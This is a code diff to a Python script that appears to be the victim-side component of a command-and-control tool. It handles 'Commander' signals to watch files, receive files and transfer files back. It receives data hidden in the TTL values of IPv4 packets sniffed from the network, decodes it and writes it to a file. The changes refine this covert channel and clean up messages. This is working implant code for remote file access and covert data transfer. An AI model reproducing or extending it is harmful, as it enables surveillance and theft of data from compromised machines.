@@ -1,4 +1,5 @@
 import base64
+import string
 import threading
 import time
 
@@ -214,11 +215,13 @@ if __name__ == '__main__':
 
                         # Close Watch Stop Thread
                         watch_stop_thread.join()
-                        print("[+] WATCH FILE STOPPED: Watch file has stopped!")
+                        print(constants.WATCH_FILE_STOPPED)
                     else:
                         print(constants.WATCH_FILE_NOT_EXIST_MSG.format(file_path))
                         client_socket.send((constants.STATUS_FALSE + "/" +
                                             constants.WATCH_FILE_NOT_EXIST_TO_CMDR.format(file_path)).encode())
+
+
 
                 # e) Receive File from Commander
                 if data.decode() == constants.TRANSFER_FILE_SIGNAL:
@@ -236,28 +239,33 @@ if __name__ == '__main__':
                     print(constants.CLIENT_RESPONSE.format("Total Number of Packets: {}".format(count)))
 
                     # Function to extract and decode the TTL values to retrieve data
-                    def extract_data(packet):
+                    def extract_data_ipv4_ttl(packet):
                         if packet.haslayer('IP'):
                             ttl = packet[IP].ttl
-                            print(ttl)
-                            binary_data = format(ttl, '08b')  # Adjust to 8 bits for each character
+                            binary_data = format(ttl, constants.BINARY_MODE)  # Adjust to 8 bits for each character
                             return binary_data
 
                     # Function to convert binary data to text
                     def bin_to_text(binary_data):
                         text = ''
+
                         for i in range(0, len(binary_data), 8):
                             byte = binary_data[i:i + 8]
                             if byte != '00000000':  # Ensure not to append null bytes
                                 text += chr(int(byte, 2))
+
+                        # Filter out non-printable characters
+                        text = ''.join(filter(lambda x: x in string.printable, text))
                         return text
 
                     # Callback function for handling received packets
                     def packet_callback(packet):
-                        binary_data = extract_data(packet)
+                        global filename
+                        binary_data = extract_data_ipv4_ttl(packet)
+
                         if binary_data:
                             text_data = bin_to_text(binary_data)
-                            with open(filename, 'w') as f:  # Use 'a' for appending mode
+                            with open(filename, 'a') as f:
                                 f.write(text_data)
 
                     # Start sniffing for a specific number of packets
@@ -269,6 +277,8 @@ if __name__ == '__main__':
                         client_socket.send(constants.VICTIM_ACK.encode())
                     else:
                         client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
+
+
 
                 # f) Transfer file to Commander
                 if data.decode() == constants.GET_FILE_SIGNAL:
